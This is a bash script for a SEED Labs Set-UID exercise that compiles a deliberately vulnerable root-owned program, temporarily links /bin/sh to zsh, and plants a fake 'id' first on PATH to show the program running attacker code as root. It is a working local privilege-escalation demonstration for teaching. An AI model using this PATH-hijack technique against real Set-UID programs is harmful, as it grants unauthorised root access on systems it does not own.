#!/bin/bash
set -euo pipefail

# E6b: PATH hijack against the vulnerable Set-UID fixture.
#
# SEED Ubuntu's /bin/sh is usually dash, which drops Set-UID privileges when
# invoked by system().  zsh is therefore required for this demonstration.
# The script never installs packages or leaves /bin/sh changed behind.
root_dir=$(cd "$(dirname "$0")/.." && pwd)
lab_dir="$root_dir/Labsetup"
work_dir=$(mktemp -d /tmp/lab1-e6b.XXXXXX)
proof="$work_dir/proof"
evil_dir="$work_dir/evil"
mkdir -p "$evil_dir"

cleanup() {
    if [[ -e /bin/sh.lab1-original || -L /bin/sh.lab1-original ]]; then
        sudo rm -f /bin/sh
        sudo mv /bin/sh.lab1-original /bin/sh
    fi
    rm -rf "$work_dir"
}
trap cleanup EXIT

command -v zsh >/dev/null || {
    echo "zsh is required by this SEED demonstration; install it in the isolated VM first." >&2
    exit 1
}

if [[ ! -x "$lab_dir/catall_e6b" ]]; then
    gcc "$lab_dir/catall_e6b.c" -o "$lab_dir/catall_e6b"
    sudo chown root:root "$lab_dir/catall_e6b"
    sudo chmod 4755 "$lab_dir/catall_e6b"
fi

cat > "$evil_dir/id" <<EOF
#!/bin/sh
/usr/bin/id -u > "$proof"
EOF
chmod 755 "$evil_dir/id"

# Keep the original link recoverable and restore it even on failure.
sudo mv /bin/sh /bin/sh.lab1-original
sudo ln -s /bin/zsh /bin/sh
PATH="$evil_dir:/usr/bin:/bin" "$lab_dir/catall_e6b"

echo "Proof file content (0 means the substituted id ran as root):"
cat "$proof"
